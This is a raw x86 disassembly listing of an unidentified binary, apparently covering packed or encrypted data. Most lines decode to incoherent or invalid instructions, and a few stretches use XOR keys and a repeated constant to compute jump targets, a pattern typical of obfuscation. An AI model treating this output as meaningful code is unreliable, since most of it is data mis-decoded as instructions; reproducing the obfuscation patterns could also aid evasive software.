  407b27:	push   es
  407b28:	sbb    esp,edx
  407b2a:	pop    edi
  407b2b:	ret    0x7463
  407b2e:	xchg   edx,eax
  407b2f:	clc    
  407b30:	inc    ecx
  407b31:	rol    DWORD PTR [eax+0x47],1
  407b34:	push   ss
  407b35:	dec    edx
  407b36:	sub    edx,ebp
  407b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b39:	push   edi
  407b3a:	mov    BYTE PTR [ebp+edi*1-0x7],cl
  407b3e:	fsub   QWORD PTR [eax+0x70046acf]
  407b44:	pop    ebx
  407b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b46:	jg     0x407b14
  407b48:	push   ss
  407b49:	imul   edi,ebx,0xffffffa7
  407b4c:	ss loope 0x407b77
  407b4f:	sub    al,0x94
  407b51:	dec    edi
  407b52:	pop    eax
  407b53:	rol    BYTE PTR [edx+0x7c],0xd2
  407b57:	mov    ebx,0x62fcd9a0
  407b5c:	dec    edx
  407b5d:	int    0xf0
  407b5f:	ss aas 
  407b61:	inc    esi
  407b62:	fadd   DWORD PTR [edi-0x7344f8e3]
  407b68:	sbb    bl,BYTE PTR [edi+0x22c074a9]
  407b6e:	loop   0x407b60
  407b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b71:	shl    ecx,1
  407b73:	outs   dx,DWORD PTR ds:[esi]
  407b74:	lds    eax,FWORD PTR [ecx+0x59025a1f]
  407b7a:	neg    DWORD PTR ds:0x3a14ec3d
  407b80:	sub    eax,ebx
  407b82:	adc    edi,edi
  407b84:	lods   eax,DWORD PTR ds:[esi]
  407b85:	das    
  407b86:	aas    
  407b87:	in     eax,dx
  407b88:	outs   dx,BYTE PTR ds:[esi]
  407b89:	dec    eax
  407b8a:	in     eax,dx
  407b8b:	adc    eax,0x3aa00c35
  407b90:	adc    DWORD PTR ds:0x5dc31c46,esi
  407b96:	lds    ebp,FWORD PTR [ebx-0x2e]
  407b99:	call   0xf50c:0xcac3930a
  407ba0:	mov    bh,0xe2
  407ba2:	mov    ebp,0x7fc46f1e
  407ba7:	daa    
  407ba8:	fadd   DWORD PTR [eax-0x635754c2]
  407bae:	mov    ecx,0xebc3e571
  407bb3:	jmp    0x5ff93480
  407bb8:	leave  
  407bb9:	push   esp
  407bba:	dec    edx
  407bbb:	ins    DWORD PTR es:[edi],dx
  407bbc:	push   es
  407bbd:	inc    ecx
  407bbe:	and    al,0x2d
  407bc0:	sub    DWORD PTR [edx],ecx
  407bc2:	ins    BYTE PTR es:[edi],dx
  407bc3:	push   esi
  407bc4:	inc    eax
  407bc5:	dec    eax
  407bc6:	aaa    
  407bc7:	lds    eax,FWORD PTR [edi]
  407bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bcb:	jp     0x407b5d
  407bcd:	pop    ebx
  407bce:	and    ah,BYTE PTR [edx+esi*2-0x3bead1dc]
  407bd5:	vmptrld QWORD PTR [ecx-0x34]
  407bd9:	daa    
  407bda:	stc    
  407bdb:	mov    bh,0xe8
  407bdd:	jno    0x407ba4
  407bdf:	(bad)  
  407be0:	out    dx,eax
  407be1:	mov    DWORD PTR [ecx-0x250df384],edx
  407be7:	scas   eax,DWORD PTR es:[edi]
  407be8:	enter  0xd40e,0x16
  407bec:	cld    
  407bed:	pushf  
  407bee:	lods   al,BYTE PTR ds:[esi]
  407bef:	xchg   ebp,eax
  407bf0:	mov    BYTE PTR [edx-0x16cba7e],ch
  407bf6:	mov    edx,0x27a31797
  407bfb:	(bad)  
  407bfc:	lock xor eax,0x2044b548
  407c02:	mov    bh,0x7c
  407c04:	pushw  cs
  407c06:	inc    esp
  407c07:	jl     0x407ba7
  407c09:	pop    esp
  407c0a:	mov    bh,0xf2
  407c0c:	add    al,dl
  407c0e:	xor    al,0xf0
  407c10:	mov    ch,al
  407c12:	(bad)  
  407c13:	fiadd  WORD PTR [ebp+0x2b2e86c6]
  407c19:	daa    
  407c1a:	in     eax,dx
  407c1b:	mov    al,0x99
  407c1d:	loop   0x407c63
  407c1f:	mov    al,ds:0x54148fa6
  407c24:	mov    cs,WORD PTR [edx+0x70716b65]
  407c2a:	jne    0x407c5a
  407c2c:	ror    BYTE PTR [esi],1
  407c2e:	cld    
  407c2f:	aam    0xae
  407c31:	data16 cmp BYTE PTR [eax+0x3cf5e4f9],al
  407c38:	mov    ebx,DWORD PTR [ebx]
  407c3a:	add    eax,0x878afee4
  407c3f:	pop    edx
  407c40:	jae    0x407c31
  407c42:	in     eax,dx
  407c43:	mov    eax,DWORD PTR [ebp-0x1c]
  407c46:	imul   eax,ecx
  407c49:	sub    esp,eax
  407c4b:	mov    DWORD PTR [ebp-0x24],esp
  407c4e:	jmp    0x407dd7
  407c53:	dec    esi
  407c54:	cli    
  407c55:	sbb    al,0xe
  407c57:	test   al,0xda
  407c59:	outs   dx,BYTE PTR ds:[esi]
  407c5a:	jp     0x407c98
  407c5c:	out    0x6d,eax
  407c5e:	rol    BYTE PTR [esi-0x6b],1
  407c61:	xchg   DWORD PTR [edi],eax
  407c63:	xor    esp,DWORD PTR [esi]
  407c65:	jl     0x407ce3
  407c67:	call   0xdbbcf8eb
  407c6c:	add    eax,0x78fa3d4e
  407c71:	pop    ecx
  407c72:	mov    eax,0x5af52b7e
  407c77:	push   ebp
  407c78:	push   ebp
  407c79:	fdiv   QWORD PTR [eax+edi*2]
  407c7c:	(bad)  
  407c7d:	popa   
  407c7e:	and    eax,0xca082150
  407c83:	fmul   DWORD PTR ds:0x4195de2c
  407c89:	aas    
  407c8a:	jne    0x407c0f
  407c8c:	shl    ecx,cl
  407c8e:	mov    bl,0x56
  407c90:	shl    BYTE PTR [eax+edi*8-0x48e43ed3],1
  407c97:	push   ebp
  407c98:	xchg   ebx,eax
  407c99:	sahf   
  407c9a:	rcr    DWORD PTR [esi],0x54
  407c9d:	lock fild WORD PTR [esi-0x22]
  407ca1:	push   ecx
  407ca2:	stc    
  407ca3:	(bad)  
  407ca4:	cmp    al,BYTE PTR [ecx-0x5d13d681]
  407caa:	jmp    0x410f:0x97fb6c8c
  407cb1:	xchg   ecx,eax
  407cb2:	cmp    al,BYTE PTR [eax-0x5f]
  407cb5:	adc    eax,0xb723160c
  407cba:	mov    BYTE PTR [eax-0x1b],al
  407cbd:	push   ecx
  407cbe:	rcl    DWORD PTR cs:[edx+edi*4+0x5a],1
  407cc3:	aaa    
  407cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc5:	and    BYTE PTR ds:0xf970ee3f,al
  407ccb:	ins    BYTE PTR es:[edi],dx
  407ccc:	push   0x42aa22bb
  407cd1:	aad    0xc
  407cd3:	sti    
  407cd4:	leave  
  407cd5:	push   0x6bbb927c
  407cda:	fwait
  407cdb:	xchg   esp,eax
  407cdc:	scas   al,BYTE PTR es:[edi]
  407cdd:	aam    0x93
  407cdf:	imul   ebx,ebp,0x83fe31bb
  407ce5:	sub    al,0x9d
  407ce7:	mov    ecx,0x134fccb9
  407cec:	mov    DWORD PTR [edx+0x5a],edi
  407cef:	sbb    dh,BYTE PTR [ecx-0x42c88607]
  407cf5:	cmc    
  407cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cf7:	fwait
  407cf8:	xchg   DWORD PTR [eax-0x1347c11f],ebx
  407cfe:	push   ds
  407cff:	xchg   esi,eax
  407d00:	lea    esi,[ecx]
  407d02:	fidiv  WORD PTR [ebx]
  407d04:	inc    eax
  407d05:	cdq    
  407d06:	sbb    bl,BYTE PTR [esp+ebx*8]
  407d09:	add    al,0x6b
  407d0b:	and    ah,BYTE PTR [ecx+0x20]
  407d0e:	mov    BYTE PTR ds:0xf2021f5,cl
  407d14:	inc    ebp
  407d15:	lds    eax,FWORD PTR ds:[edx+ecx*4]
  407d19:	repnz ficom WORD PTR [esi]
  407d1c:	loopne 0x407d07
  407d1e:	in     eax,dx
  407d1f:	mov    bh,0xda
  407d21:	dec    edx
  407d22:	mov    dh,0x6d
  407d24:	jae    0x407d20
  407d26:	mov    dl,0x1b
  407d28:	out    dx,al
  407d29:	fcomi  st,st(1)
  407d2b:	jge    0x407da9
  407d2d:	mov    eax,0xc4724f68
  407d32:	mov    eax,DWORD PTR [ebp+0x6ec8ee97]
  407d38:	cs je  0x407ce5
  407d3b:	jbe    0x407da0
  407d3d:	and    esp,eax
  407d3f:	pop    ds
  407d40:	mov    bh,0xd7
  407d42:	push   ebp
  407d43:	sub    eax,DWORD PTR [ebx-0x7b]
  407d46:	std    
  407d47:	inc    eax
  407d48:	mov    al,0x3c
  407d4a:	pushf  
  407d4b:	or     ebx,DWORD PTR [edx]
  407d4d:	mov    ds:0xd8b0ff87,eax
  407d52:	mul    BYTE PTR [eax-0x4e]
  407d55:	call   FWORD PTR [esi-0x4d]
  407d58:	push   0x5e8daeef
  407d5d:	jno    0x407d90
  407d5f:	xchg   BYTE PTR [ebp+0x1e23db25],al
  407d65:	and    ebp,ebp
  407d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d68:	fstp   st(2)
  407d6a:	lds    esi,FWORD PTR [eax+0x40]
  407d6d:	sbb    eax,0x7e962ebf
  407d72:	lahf   
  407d73:	xchg   ecx,eax
  407d74:	adc    DWORD PTR [ecx+0x3a94c490],ecx
  407d7a:	loop   0x407d53
  407d7c:	scas   eax,DWORD PTR es:[edi]
  407d7d:	push   esi
  407d7e:	jnp    0x407d72
  407d80:	test   eax,0x8518e013
  407d85:	mov    gs,eax
  407d87:	(bad)  [ebp-0x60]
  407d8a:	xor    ebp,DWORD PTR [edi+0x3f50104]
  407d90:	jge    0x407def
  407d92:	inc    eax
  407d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d94:	dec    eax
  407d95:	enter  0x7777,0x74
  407d99:	sub    DWORD PTR [ebx-0x475fa4d0],esp
  407d9f:	push   0xab0f3255
  407da4:	pop    es
  407da5:	rol    DWORD PTR [edi],cl
  407da7:	dec    esi
  407da8:	pop    ss
  407da9:	sub    DWORD PTR [edi-0x57],edx
  407dac:	shl    dh,0x93
  407daf:	fcmovnu st,st(3)
  407db1:	imul   edx,DWORD PTR [ebx-0x7b],0xbbabdca8
  407db8:	push   eax
  407db9:	push   cs
  407dba:	and    ch,BYTE PTR [ebx+0x49a25f24]
  407dc0:	and    ebx,DWORD PTR [edi-0x643b8e81]
  407dc6:	fsub   QWORD PTR [esi+0x7a]
  407dc9:	fistp  QWORD PTR [esi]
  407dcb:	push   0xffffffa4
  407dcd:	xchg   ebx,eax
  407dce:	outs   dx,DWORD PTR ds:[esi]
  407dcf:	ror    BYTE PTR [eax-0x6151d4a3],cl
  407dd5:	fldenv [ebx-0x4603ba75]
  407ddb:	push   edi
  407ddc:	or     BYTE PTR [ecx+0x7],dl
  407ddf:	xor    eax,ecx
  407de1:	mov    edx,0x32729e
  407de6:	add    eax,edx
  407de8:	jmp    0x407f71
  407ded:	push   0xffffffd5
  407def:	mov    ebp,0x7d64bd94
  407df4:	aad    0x16
  407df6:	sbb    bl,BYTE PTR [esi+0x4b01e58e]
  407dfc:	dec    edx
  407dfd:	scas   eax,DWORD PTR es:[edi]
  407dfe:	cmp    DWORD PTR [esp+edi*2-0x18],edi
  407e02:	jg     0x407e80
  407e04:	jl     0x407e84
  407e06:	xchg   ebp,eax
  407e07:	adc    DWORD PTR [eax-0x64],esp
  407e0a:	push   edi
  407e0b:	mov    eax,ds:0x2d19247
  407e10:	sub    BYTE PTR [ebp-0x6b],ah
  407e13:	(bad)  
  407e14:	jle    0x407df5
  407e16:	in     al,0xe9
  407e18:	inc    edi
  407e19:	mov    esp,0x838e95f
  407e1e:	xor    edi,esi
  407e20:	test   BYTE PTR [eax-0x56],bh
  407e23:	mov    ebp,0xfc4ebfb6
  407e28:	adc    al,0xeb
  407e2a:	add    eax,0x838a7658
  407e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e30:	pop    esi
  407e31:	push   0xdf456c42
  407e36:	sbb    al,0x8e
  407e38:	or     bh,BYTE PTR [esi-0x20c526b3]
  407e3e:	xor    al,0xd0
  407e40:	add    eax,0x3cb4403e
  407e45:	cmc    
  407e46:	inc    edx
  407e47:	clc    
  407e48:	adc    al,0x7c
  407e4a:	sub    al,0xa8
  407e4c:	stos   BYTE PTR es:[edi],al
  407e4d:	push   ss
  407e4e:	xor    esp,DWORD PTR [edx-0x52d70106]
  407e54:	sti    
  407e55:	in     eax,dx
  407e56:	into   
  407e57:	sbb    ah,ch
  407e59:	nop
  407e5a:	cwde   
  407e5b:	cmp    al,0xac
  407e5d:	xchg   ebx,eax
  407e5e:	inc    ebp
  407e5f:	xor    BYTE PTR [esi-0x3e3789e9],0x12
  407e66:	pop    edx
  407e67:	call   0xb456:0xe33d994e
  407e6e:	cmp    eax,0xd26b6226
  407e73:	push   esp
  407e74:	(bad)  
  407e75:	mov    eax,ds:0x823a0398
  407e7a:	fst    QWORD PTR es:[eax]
  407e7d:	xchg   ebx,eax
  407e7e:	xor    ch,bl
  407e80:	xchg   esi,eax
  407e81:	mov    ecx,0xcd644d30
  407e86:	test   eax,0x2e3aa790
  407e8b:	in     al,dx
  407e8c:	cdq    
  407e8d:	psubd  mm7,QWORD PTR [esi+0xf]
  407e91:	fst    DWORD PTR [ecx]
  407e93:	retf   
  407e94:	xor    dl,ch
  407e96:	(bad)  [eax]
  407e98:	pop    ds
  407e99:	out    dx,eax
  407e9a:	add    BYTE PTR [ebp+0x33],ch
  407e9d:	push   0x40a3e2c6
  407ea2:	into   
  407ea3:	xor    eax,0xddd943d6
  407ea8:	pop    esp
  407ea9:	pushf  
  407eaa:	stos   DWORD PTR es:[edi],eax
  407eab:	int    0x56
  407ead:	pop    esi
  407eae:	test   BYTE PTR [edi],ch
  407eb0:	push   cs
  407eb1:	lea    ebp,[esi]
  407eb3:	enter  0x5eb2,0x6d
  407eb7:	xor    DWORD PTR [edx-0x5c],ecx
  407eba:	(bad)  
  407ebb:	nop
  407ebc:	bound  ecx,QWORD PTR [eax+0x2eb6315a]
  407ec2:	rcl    esi,cl
  407ec4:	fst    DWORD PTR [eax-0x41]
  407ec7:	dec    eax
  407ec8:	sbb    al,0x17
  407eca:	pop    ebp
  407ecb:	ins    BYTE PTR es:[edi],dx
  407ecc:	loope  0x407ead
  407ece:	or     BYTE PTR [edx],bl
  407ed0:	aam    0x7e
  407ed2:	sub    cl,cl
  407ed4:	dec    esp
  407ed5:	pop    ecx
  407ed6:	lds    esi,FWORD PTR [edx]
  407ed8:	mov    ?,WORD PTR [edx+esi*1+0x6b0368c0]
  407edf:	push   esi
  407ee0:	jne    0x407f1f
  407ee2:	not    DWORD PTR [esp+eax*8-0x17]
  407ee6:	push   0xc7c6a240
  407eeb:	out    0x54,al
  407eed:	sbb    ebx,DWORD PTR [ebp+0x1cf2d256]
  407ef3:	out    0x2e,eax
  407ef5:	mov    ss,WORD PTR [eax+ebx*1]
  407ef8:	test   eax,0x3b6b55e9
  407efd:	scas   eax,DWORD PTR es:[edi]
  407efe:	add    esp,ecx
  407f00:	data16 jecxz 0x407f77
  407f03:	pop    ecx
  407f04:	push   ebp
  407f05:	xor    al,0x51
  407f07:	push   0x6cd011ec
  407f0c:	sbb    esp,DWORD PTR [edx+0x403e3180]
  407f12:	adc    DWORD PTR [ebp+eiz*2-0x15],esp
  407f16:	mov    bh,0x4a
  407f18:	loope  0x407f80
  407f1a:	xchg   ebx,eax
  407f1b:	mov    esi,0x7a19de80
  407f20:	pop    ss
  407f21:	mov    edx,0x96b37b9c
  407f26:	sbb    BYTE PTR [edi+ebx*2],dh
  407f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f2a:	cmc    
  407f2b:	int    0x83
  407f2d:	lea    ecx,[ebx]
  407f2f:	test   DWORD PTR [esp+eax*2+0x5d],eax
  407f33:	(bad)  
  407f34:	pop    edx
  407f35:	push   0xea4711aa
  407f3a:	int3   
  407f3b:	push   ebp
  407f3c:	mov    eax,0x7ea8ea66
  407f41:	cdq    
  407f42:	scas   eax,DWORD PTR es:[edi]
  407f43:	add    al,0x45
  407f45:	loope  0x407efe
  407f47:	outs   dx,DWORD PTR ds:[esi]
  407f48:	scas   al,BYTE PTR es:[edi]
  407f49:	push   cs
  407f4a:	mov    esp,0x38583549
  407f4f:	out    dx,al
  407f50:	retf   0x1f78
  407f53:	sbb    esi,DWORD PTR [eax-0x42]
  407f56:	mov    edi,ds
  407f58:	(bad)  
  407f59:	fidivr WORD PTR [edi+0x4b]
  407f5c:	(bad)
  407f60:	int    0xf5
  407f62:	call   0x9088:0xb36750d6
  407f69:	repnz xor al,BYTE PTR [edx-0x41a36518]
  407f70:	jno    0x407efb
  407f72:	inc    ebp
  407f73:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  407f79:	add    eax,edx
  407f7b:	mov    edx,DWORD PTR [ebp+0x14]
  407f7e:	imul   eax,DWORD PTR [edx]
  407f81:	mov    edx,DWORD PTR [ebp-0x4]
  407f84:	xor    edx,ecx
  407f86:	mov    ecx,DWORD PTR [ebp+0x8]
  407f89:	lea    ecx,[edx+ecx*1+0x32729e]
  407f90:	cmp    ecx,eax
  407f92:	je     0x4087b6
  407f98:	mov    edi,DWORD PTR [ebp-0x18]
  407f9b:	mov    eax,DWORD PTR [ebp+0x8]
  407f9e:	mov    edx,DWORD PTR [ebp+0x14]
  407fa1:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  407fa5:	mov    ecx,0x7510857
  407faa:	xor    edx,edx
  407fac:	xor    edi,ecx
  407fae:	mov    esi,0x32729e
  407fb3:	add    edi,esi
  407fb5:	jmp    0x40813e
  407fba:	je     0x40800f
  407fbc:	jne    0x407fa1
  407fbe:	ins    DWORD PTR es:[edi],dx
  407fbf:	gs out 0x7b,al
  407fc2:	aam    0xcc
  407fc4:	pop    es
  407fc5:	addr16 add bl,ah
  407fc8:	mov    bh,0x24
  407fca:	sbb    edi,DWORD PTR [ebx]
  407fcc:	jl     0x40804a
  407fce:	call   0x7abcfc52
  407fd3:	aam    0x22
  407fd5:	aam    0x78
  407fd7:	cld    
  407fd8:	sub    DWORD PTR es:[edi-0x3db751cd],edi
  407fdf:	mov    esp,0xb19cf2db
  407fe4:	pop    ds
  407fe5:	jae    0x407fd1
  407fe7:	jnp    0x408068
  407fe9:	clc    
  407fea:	dec    esp
  407feb:	adc    dl,BYTE PTR [edi+eiz*4+0x52]
  407fef:	dec    ebp
  407ff0:	or     al,0x1a
  407ff2:	out    0x97,al
  407ff4:	imul   ebx,ecx,0x68f4a753
  407ffa:	lds    ebx,FWORD PTR [ecx+0x76c380cc]
  408000:	xor    eax,0x7035e6ea
  408005:	push   es
  408006:	lods   eax,DWORD PTR ds:[esi]
  408007:	and    dl,dh
  408009:	int    0xab
  40800b:	stos   BYTE PTR es:[di],al
  40800d:	nop
  40800e:	adc    eax,0x68880376
  408013:	dec    ebp
  408014:	push   0x28028c75
  408019:	fdivrp st(5),st
  40801b:	test   BYTE PTR [edi+0x7d24c3d1],0xb7
  408022:	in     eax,0x88
  408024:	lods   al,BYTE PTR ds:[esi]
  408025:	mov    ch,0xcf
  408027:	sub    ebx,DWORD PTR [esi]
  408029:	mov    esi,0xd79269e2
  40802e:	push   ss
  40802f:	jb     0x408018
  408031:	aam    0xb4
  408033:	daa    
  408034:	xchg   ecx,eax
  408035:	adc    eax,0x8c52b2c0
  40803a:	lahf   
  40803b:	jno    0x408034
  40803d:	fld    st(7)
  40803f:	fsub   DWORD PTR [edi+edx*8-0x5ad4fdc7]
  408046:	stos   DWORD PTR es:[edi],eax
  408047:	pusha  
  408048:	pop    ebx
  408049:	shl    DWORD PTR [eax-0x1fc2810e],1
  40804f:	loopne 0x408025
  408051:	mov    ah,BYTE PTR [eax]
  408053:	aaa    
  408054:	cs push esp
  408056:	ins    DWORD PTR es:[edi],dx
  408057:	and    ebp,esi
  408059:	fcmovnbe st,st(7)
  40805b:	dec    esp
  40805c:	aam    0x9
  40805e:	cmp    dh,BYTE PTR [edi+0x1b]
  408061:	push   edx
  408062:	xlat   BYTE PTR ds:[ebx]
  408063:	fsubr  QWORD PTR [ecx-0x51]
  408066:	dec    ebp
  408067:	(bad)  
  408068:	fs inc ecx
  40806a:	vmwrite ebp,DWORD PTR fs:[ecx+0x65]
  40806f:	(bad)  {k3}{z}
  408074:	xchg   ecx,eax
  408075:	cmc    
  408076:	inc    edi
  408077:	pop    ecx
  408078:	js     0x4080e6
  40807a:	mov    esi,0x6f545197
  40807f:	mov    gs,WORD PTR [ebp-0x6a9b378c]
  408085:	fsub   QWORD PTR [ebx+ecx*1-0x67]
  408089:	or     DWORD PTR [ecx+0x585501e0],edx
  40808f:	fnsave [edx]
  408091:	mov    dl,dh
  408093:	inc    eax
  408094:	pusha  
  408095:	or     DWORD PTR [ebx],edi
  408097:	sbb    esi,DWORD PTR ds:0x97fc88a7
  40809d:	aam    0x7c
  40809f:	je     0x40805c
  4080a1:	ins    DWORD PTR es:[edi],dx
  4080a2:	dec    esp
  4080a3:	pop    edx
  4080a4:	cmp    eax,0xca12cd4d
  4080a9:	js     0x4080c6
  4080ab:	cmp    al,0xf0
  4080ad:	and    BYTE PTR [ebx+ebp*1+0x5a],dh
  4080b1:	xor    bh,BYTE PTR [edx+0x40]
  4080b4:	mov    DWORD PTR [esi+0x5],ebp
  4080b7:	cli    
  4080b8:	inc    DWORD PTR [ebx]
  4080ba:	xchg   cl,bh
  4080bc:	sub    al,0x4a
  4080be:	push   esp
  4080bf:	dec    eax
  4080c0:	test   DWORD PTR [eax],edi
  4080c2:	pop    ebp
  4080c3:	mov    WORD PTR [esp+esi*4-0x6b29e8e9],cs
  4080ca:	arpl   sp,sp
  4080cc:	mov    dl,0x8b
  4080ce:	ds loop 0x408124
  4080d1:	xor    BYTE PTR ds:0x28226a62,bh
  4080d7:	out    dx,eax
  4080d8:	jge    0x4080a3
  4080da:	rcl    BYTE PTR [edi-0x7],0x46
  4080de:	aad    0xbe
  4080e0:	mov    ch,0x7b
  4080e2:	int    0x84
  4080e4:	sbb    DWORD PTR [edx-0x5adacc6b],esp
  4080ea:	jg     0x408109
  4080ec:	sub    bh,BYTE PTR gs:[edx]
  4080ef:	inc    ebp
  4080f0:	inc    ebx
  4080f1:	mov    ds:0x9325a8b7,eax
  4080f6:	mov    ebp,edx
  4080f8:	iret   
  4080f9:	or     eax,0xa80e1971
  4080fe:	push   ss
  4080ff:	jmp    0x408108
  408101:	mov    eax,ds:0x6a6d3738
  408106:	or     DWORD PTR [ebx-0x37],edx
  408109:	out    0x94,al
  40810b:	ins    BYTE PTR es:[edi],dx
  40810c:	lahf   
  40810d:	adc    ecx,DWORD PTR cs:[edx+0x6d969a2a]
  408114:	popf   
  408115:	xchg   ebp,eax
  408116:	pop    ds
  408117:	mov    ds:0xdb176d81,al
  40811c:	shl    BYTE PTR [edx],0x5b
  40811f:	aaa    
  408120:	push   ss
  408121:	popa   
  408122:	pop    eax
  408123:	xor    al,0x10
  408125:	add    eax,0xfa232ad
  40812a:	sti    
  40812b:	xchg   esi,eax
  40812c:	shl    BYTE PTR [esi+eiz*8-0x3b],1
  408130:	fimul  WORD PTR [esi+ecx*2]
  408133:	ror    BYTE PTR [edi+0x70435cd1],0xb5
  40813a:	pop    ds
  40813b:	mov    ch,0x6d
  40813d:	mov    al,0xf7
  40813f:	test   DWORD PTR [ebx-0x2ecc03ab],0x9e02848d
  408149:	jb     0x40817d
  40814b:	add    BYTE PTR [ebx+0x7d8b0855],cl
  408151:	fmul   QWORD PTR [ecx+0x458b9704]
  408157:	call   0x3348d6e7
  40815c:	ror    DWORD PTR [ebp+0x729e1084],0x32
  408163:	add    BYTE PTR [ecx+0x458b0845],cl
  408169:	call   0x420657
  40816e:	add    BYTE PTR [esi-0x5c21b48],bl
  408174:	jge    0x4081cb
  408176:	mov    ebx,0x5d2a391f
  40817b:	inc    ecx
  40817c:	jae    0x4081ee
  40817e:	inc    eax
  40817f:	idiv   DWORD PTR [edx]
  408181:	jl     0x4081ff
  408183:	call   0x30bcfe07
  408188:	out    dx,al
  408189:	mov    ebp,0x2dad5126
  40818e:	sub    ebp,ecx
  408190:	dec    esp
  408191:	sbb    eax,0xffffff83
  408194:	xchg   ebp,eax
  408195:	outs   dx,BYTE PTR ds:[esi]
  408196:	or     dh,BYTE PTR [edi+ecx*2]
  408199:	mov    ah,0xc0
  40819b:	leave  
  40819c:	sub    eax,0x67fccca3
  4081a1:	sbb    esi,DWORD PTR [eax]
  4081a3:	(bad)  
  4081a4:	test   BYTE PTR [ebx+0x20],0x3f
  4081a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081a9:	push   esi
  4081aa:	xchg   ebp,eax
  4081ab:	pop    ds
  4081ac:	int    0xdf
  4081ae:	push   ebx
  4081af:	mov    dh,0x6b
  4081b1:	mov    ebx,0x1babfb54
  4081b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b7:	sahf   
  4081b8:	xor    edi,DWORD PTR [edi]
  4081ba:	test   esp,ebx
  4081bc:	adc    al,0x9c
  4081be:	out    dx,al
  4081bf:	push   cs
  4081c0:	imul   edx,esi,0x63
  4081c3:	dec    ebx
  4081c4:	out    dx,eax
  4081c5:	ret    0xe73
  4081c8:	les    edx,FWORD PTR [eax-0x1b0e431e]
  4081ce:	or     al,0x74
  4081d0:	icebp  
  4081d1:	cmp    al,0xec
  4081d3:	and    al,0x26
  4081d5:	sub    BYTE PTR [ecx],ah
  4081d7:	mov    ebp,0xbe4d008f
  4081dc:	ficom  WORD PTR [edi+0x72259092]
  4081e2:	inc    eax
  4081e3:	pop    edi
  4081e4:	push   esp
  4081e5:	adc    esp,esi
  4081e7:	sub    esp,edx
  4081e9:	xlat   BYTE PTR ds:[ebx]
  4081ea:	stos   DWORD PTR es:[edi],eax
  4081eb:	outs   dx,DWORD PTR ds:[esi]
  4081ec:	ss mov ch,0x22
  4081ef:	loope  0x40822e
  4081f1:	xchg   ecx,eax
  4081f2:	push   esp
  4081f3:	test   BYTE PTR [ecx+0x39e552b3],dl
  4081f9:	retf   0x91ea
  4081fc:	jnp    0x4081c7
  4081fe:	or     al,0x72
  408200:	nop
  408201:	xchg   ebx,eax
  408202:	aad    0x60
  408204:	inc    ebp
  408205:	mov    ebp,0xed41d77f
  40820a:	adc    DWORD PTR [ebp+0x8],0x33
  40820e:	out    0xa2,al
  408210:	rcl    DWORD PTR [esi+0x7e],cl
  408213:	sub    al,0x97
  408215:	push   ebx
  408216:	mov    ds:0x7beb2734,al
  40821b:	and    al,0x8
  40821d:	stos   DWORD PTR es:[edi],eax
  40821e:	rol    BYTE PTR [ecx],0xe7
  408221:	int    0x69
  408223:	pop    ebx
  408224:	fidivr WORD PTR [esi+ebp*4]
  408227:	cmp    al,0xa2
  408229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40822a:	adc    BYTE PTR [ebx+0x6d4263c1],al
  408230:	out    dx,al
  408231:	inc    ebp
  408232:	aad    0xe4
  408234:	aas    
  408235:	adc    BYTE PTR [eax+0x59c35305],bl
  40823b:	enter  0xdd04,0xa2
  40823f:	pop    ds
  408240:	xchg   BYTE PTR [ebp+0x693a3404],dl
  408246:	push   ds
  408247:	mul    BYTE PTR ds:0x2d5dcd36
  40824d:	push   ebp
  40824e:	mov    bl,BYTE PTR [edi+0x22d4497d]
  408254:	mov    WORD PTR [ebx],cs
  408256:	mov    ecx,edx
  408258:	rol    BYTE PTR [ebp-0x2],0x6c
  40825c:	or     BYTE PTR [esi],bl
  40825e:	das    
  40825f:	inc    ebp
  408260:	jle    0x40825d
  408262:	outs   dx,DWORD PTR ds:[esi]
  408263:	scas   al,BYTE PTR es:[edi]
  408264:	das    
  408265:	arpl   WORD PTR [edi],di
  408267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408268:	add    ebx,DWORD PTR [ecx-0x74]
  40826b:	jg     0x408212
  40826d:	jmp    0x408230
  40826f:	out    dx,al
  408270:	mov    WORD PTR [ebx+esi*8+0x602dafd9],?
  408277:	adc    al,0x23
  408279:	sub    DWORD PTR [ebp+0x5731c7ed],edx
  40827f:	das    
  408280:	push   es
  408281:	in     al,0x71
  408283:	and    eax,0xa9e40eda
  408288:	les    eax,FWORD PTR [ebp-0x2ea7263e]
  40828e:	test   eax,0xf0d62c7
  408293:	fidiv  WORD PTR [edi+0x525367a2]
  408299:	outs   dx,BYTE PTR ds:[esi]
  40829a:	arpl   WORD PTR [eax-0x4a],sp
  40829d:	pushf  
  40829e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40829f:	pop    ecx
  4082a0:	addr16 push 0x7
  4082a3:	add    al,0xc2
  4082a5:	js     0x408313
  4082a7:	jecxz  0x408265
  4082a9:	jp     0x408258
  4082ab:	mov    edx,0x3159777f
  4082b0:	call   FWORD PTR [eax]
  4082b2:	sbb    BYTE PTR [ebx],al
  4082b4:	ret    0x7762
  4082b7:	mov    esp,0x59c95870
  4082bc:	test   BYTE PTR [edi-0x43],0x50
  4082c0:	gs je  0x408243
  4082c3:	jno    0x408317
  4082c5:	mov    ds,WORD PTR [eax]
  4082c7:	ja     0x4082ab
  4082c9:	sub    eax,0x6c69598c
  4082ce:	and    edi,DWORD PTR [ebp+0x5a]
  4082d1:	add    ecx,esi
  4082d3:	fs pushf 
  4082d5:	jmp    0x408297
  4082d7:	(bad)  
  4082d9:	jns    0x408304
  4082db:	add    DWORD PTR [ebx+eax*1],0x778a20ad
  4082e2:	jno    0x40827f
  4082e4:	scas   al,BYTE PTR es:[edi]
